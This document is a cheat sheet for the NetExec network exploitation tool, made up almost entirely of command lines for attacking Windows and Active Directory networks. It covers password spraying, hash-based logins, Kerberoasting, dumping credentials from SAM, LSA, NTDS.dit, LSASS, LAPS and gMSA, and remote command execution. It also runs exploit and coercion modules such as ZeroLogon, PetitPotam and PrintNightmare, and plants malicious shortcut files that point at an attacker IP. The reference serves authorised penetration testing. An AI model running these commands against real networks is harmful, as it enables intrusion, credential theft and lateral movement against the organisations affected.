**Overview:**
**NetExec (NXC)** is an **open-source** network service exploitation tool used to automate the assessment of large networks. It is commonly used in Windows and Active Directory penetration tests for credential validation, SMB and LDAP enumeration, command execution, password spraying, share discovery, and post-exploitation workflows.

---
### Core Syntax

#### Basic Command Structure

```bash
nxc <protocol> <target> -u <username> -p <password> [options]
```

#### Target Specification

```bash
nxc smb 192.168.1.10                    # Single host
nxc smb 192.168.1.0/24                  # CIDR notation
nxc smb 192.168.1.10-20                 # Range
nxc smb targets.txt                     # File input
```

---

### Authentication Methods

#### Null Session

```bash
nxc smb <target> -u '' -p ''
nxc ldap <target> -u '' -p ''
```

#### Guest Account

```bash
nxc smb <target> -u 'guest' -p ''
```

#### Password Authentication

```bash
nxc smb <target> -u username -p password
nxc smb <target> -u username -p password --local-auth
```

#### Hash-Based Authentication

```bash
nxc smb <target> -u username -H <NTLM_hash>
nxc smb <target> -u username -H <LM>:<NTLM>
```

#### Kerberos Authentication

```bash
nxc smb <target> -u username -p password -k
nxc ldap <target> -u username -p password -k
nxc ldap <target> --use-kcache
```

#### Credential Files

```bash
nxc smb <target> -u users.txt -p passwords.txt
nxc smb <target> -u users.txt -H hashes.txt
```

---

### SMB Protocol Operations

#### Information Gathering

```bash
# Basic enumeration
nxc smb <target>
nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u username -p password --shares

# User enumeration
nxc smb <target> -u '' -p '' --users
nxc smb <target> -u username -p password --users
nxc smb <target> -u '' -p '' --rid-brute

# Group enumeration
nxc smb <target> -u username -p password --groups
nxc smb <target> -u username -p password --local-groups

# Session information
nxc smb <target> -u username -p password --sessions
nxc smb <target> -u username -p password --loggedon-users

# Password policy
nxc smb <target> -u username -p password --pass-pol
```

#### Comprehensive Enumeration

```bash
nxc smb <target> -u username -p password \
  --shares --users --groups --local-groups \
  --loggedon-users --sessions --rid-brute --pass-pol
```

#### SMB Signing Detection

```bash
nxc smb <target> --gen-relay-list relay_targets.txt
nxc smb <target>/24 --gen-relay-list relay_targets.txt
```

#### File Operations

```bash
# List share contents
nxc smb <target> -u username -p password --shares

# Download file
nxc smb <target> -u username -p password \
  --get-file <remote_path> <local_path> --share <sharename>

# Upload file
nxc smb <target> -u username -p password \
  --put-file <local_path> <remote_path> --share <sharename>

# Spider shares
nxc smb <target> -u username -p password -M spider_plus
nxc smb <target> -u username -p password -M spider_plus -o READ_ONLY=false
nxc smb <target> -u username -p password -M spider_plus -o EXCLUDE_DIR=IPC$,ADMIN$
```

#### Command Execution

```bash
# Execute command
nxc smb <target> -u username -p password -x "whoami"
nxc smb <target> -u username -p password -x "ipconfig /all"

# Execute PowerShell
nxc smb <target> -u username -p password -X "Get-Process"
```

---

### LDAP Protocol Operations

#### User & Group Enumeration

```bash
# Unauthenticated
nxc ldap <target> -u '' -p '' --users
nxc ldap <target> -u '' -p '' --groups

# Authenticated enumeration
nxc ldap <target> -u username -p password --users
nxc ldap <target> -u username -p password --groups

# Advanced enumeration
nxc ldap <target> -u username -p password \
  --users --groups --admin-count \
  --trusted-for-delegation --password-not-required
```

#### Kerberos Attacks

```bash
# Kerberoasting
nxc ldap <target> -u username -p password --kerberoasting kerberoast_hashes.txt

# AS-REP Roasting
nxc ldap <target> -u username -p password --asreproast asrep_hashes.txt
nxc ldap <target> -u users.txt -p '' --asreproast asrep_hashes.txt
```

#### BloodHound Data Collection

```bash
nxc ldap <target> -u username -p password --bloodhound \
  --dns-server <dns_ip> --dns-tcp -c All

nxc ldap <target> -u username -p password --bloodhound \
  --dns-server <dns_ip> -c DCOnly
```

#### LDAP Security Checks

```bash
# LDAP signing & binding
nxc ldap <target> -u username -p password -M ldap-checker

# Channel binding
nxc ldap <target> -u username -p password -M ldap-checker -o ACTION=CHANNELBIND
```

#### Delegation Enumeration

```bash
nxc ldap <target> -u username -p password --find-delegation
nxc ldap <target> -u username -p password --trusted-for-delegation
```

#### Active Directory Certificate Services

```bash
# ADCS enumeration
nxc ldap <target> -u username -p password -M adcs

# Vulnerable certificate templates
nxc ldap <target> -u username -p password -M adcs -o SERVER=<ca_server>
```

#### Machine Account Operations

```bash
# MachineAccountQuota
nxc ldap <target> -u username -p password -M maq

# Pre-Windows 2000 computer accounts
nxc ldap <target> -u username -p password -M pre2k
```

---

### MSSQL Protocol Operations

#### Authentication & Information

```bash
nxc mssql <target> -u username -p password
nxc mssql <target> -u username -p password -d database
```

#### Command Execution

```bash
# xp_cmdshell execution
nxc mssql <target> -u username -p password -x "whoami"
nxc mssql <target> -u username -p password -x "powershell -c Get-Host"
```

#### File Operations

```bash
# Download file
nxc mssql <target> -u username -p password \
  --get-file <local_output> <remote_file>

# Upload file
nxc mssql <target> -u username -p password \
  --put-file <local_file> <remote_path>
```

#### Database Operations

```bash
nxc mssql <target> -u username -p password -q "SELECT @@VERSION"
nxc mssql <target> -u username -p password --query "SELECT name FROM sys.databases"
```

---

### FTP Protocol Operations

#### Directory Listing

```bash
nxc ftp <target> -u username -p password --ls
nxc ftp <target> -u username -p password --ls /path/to/directory
```

#### File Retrieval

```bash
nxc ftp <target> -u username -p password \
  --ls /path/to/directory --get filename.txt
```

---

### SSH Protocol Operations

#### Authentication

```bash
nxc ssh <target> -u username -p password
nxc ssh <target> -u username --key-file id_rsa
```

#### Command Execution

```bash
nxc ssh <target> -u username -p password -x "uname -a"
```

---

### WinRM Protocol Operations

#### Authentication & Execution

```bash
nxc winrm <target> -u username -p password
nxc winrm <target> -u username -p password -x "whoami"
nxc winrm <target> -u username -p password -X "Get-Process"
```

---

### Credential Harvesting

#### Local Credential Extraction

```bash
# SAM database
nxc smb <target> -u username -p password --sam

# LSA secrets
nxc smb <target> -u username -p password --lsa

# DPAPI credentials
nxc smb <target> -u username -p password --dpapi

# Combined extraction
nxc smb <target> -u username -p password --sam --lsa --dpapi
```

#### Domain Credential Extraction

```bash
# NTDS.dit extraction
nxc smb <target> -u username -p password --ntds
nxc smb <target> -u username -p password --ntds --user username
nxc smb <target> -u username -p password -M ntdsutil

# LSASS process memory
nxc smb <target> -u username -p password -M lsassy
nxc smb <target> -u username -p password -M nanodump
nxc smb <target> -u username -p password -M handlekatz
```

#### LAPS Password Extraction

```bash
nxc smb <target> -u username -p password --laps
nxc ldap <target> -u username -p password --laps
```

#### Group Managed Service Accounts

```bash
# Enumerate gMSA
nxc ldap <target> -u username -p password --gmsa

# Convert gMSA ID
nxc ldap <target> -u username -p password --gmsa-convert-id <id>

# Decrypt gMSA password
nxc ldap <target> -u username -p password \
  --gmsa-decrypt-lsa <gmsa_account>
```

#### Group Policy Preferences

```bash
nxc smb <target> -u username -p password -M gpp_password
nxc smb <target> -u username -p password -M gpp_autologin
```

#### Cloud Credentials

```bash
# Microsoft Online Services account
nxc smb <target> -u username -p password -M msol
```

---

### Password Spraying

#### Basic Spraying

```bash
# Single password against multiple users
nxc smb <target> -u users.txt -p Password123 --continue-on-success

# Multiple passwords (no cartesian product)
nxc smb <target> -u users.txt -p passwords.txt \
  --no-bruteforce --continue-on-success

# With delay to avoid lockout
nxc smb <target> -u users.txt -p Password123 \
  --continue-on-success --delay 5
```

#### Multi-Protocol Spraying

```bash
nxc smb <target> -u users.txt -p passwords.txt --continue-on-success
nxc winrm <target> -u users.txt -p passwords.txt --continue-on-success
nxc ssh <target> -u users.txt -p passwords.txt --continue-on-success
nxc ldap <target> -u users.txt -p passwords.txt --continue-on-success
```

---

### Vulnerability Scanning

#### Common Active Directory Vulnerabilities

```bash
# ZeroLogon (CVE-2020-1472)
nxc smb <target> -u username -p password -M zerologon

# PetitPotam
nxc smb <target> -u username -p password -M petitpotam

# noPac (CVE-2021-42278 & CVE-2021-42287)
nxc smb <target> -u username -p password -M nopac

# PrintNightmare (CVE-2021-1675)
nxc smb <target> -u username -p password -M printnightmare

# SamAccountName spoofing
nxc smb <target> -u username -p password -M nopac
```

#### Coercion Vulnerability Checks

```bash
# Multiple coercion techniques
nxc smb <target> -u username -p password -M coerce_plus \
  -o LISTENER=<attacker_ip>

# Individual checks
nxc smb <target> -u username -p password -M petitpotam
nxc smb <target> -u username -p password -M dfscoerce
nxc smb <target> -u username -p password -M printerbug
```

---

### Advanced Modules

#### WebDAV Service Detection

```bash
nxc smb <target> -u username -p password -M webdav
nxc smb <target>/24 -u username -p password -M webdav
```

#### Endpoint Protection Enumeration

```bash
nxc smb <target> -u username -p password -M enum_av
nxc smb <target> -u username -p password -M enum_av -o SHOWALL=true
```

#### Veeam Credential Extraction

```bash
nxc smb <target> -u username -p password -M veeam
```

#### UNC Path Injection

```bash
# Create malicious shortcuts
nxc smb <target> -u username -p password -M slinky \
  -o SERVER=<attacker_ip> NAME=document.lnk

# Cleanup shortcuts
nxc smb <target> -u username -p password -M slinky \
  -o CLEANUP=True
```

#### SMB Share Analysis

```bash
# Enumerate interesting files
nxc smb <target> -u username -p password -M spider_plus \
  -o DOWNLOAD_FLAG=True

# Search for specific extensions
nxc smb <target> -u username -p password -M spider_plus \
  -o EXTENSIONS=xlsx,docx,pdf
```

#### Registry Operations

```bash
# Read registry key
nxc smb <target> -u username -p password -M reg \
  -o KEY=<registry_path>

# Write registry value
nxc smb <target> -u username -p password -M reg \
  -o KEY=<registry_path> VALUE=<data> TYPE=<type>
```

#### WMI Operations

```bash
# Execute WMI command
nxc smb <target> -u username -p password -M wmi_exec \
  -o COMMAND="whoami"
```

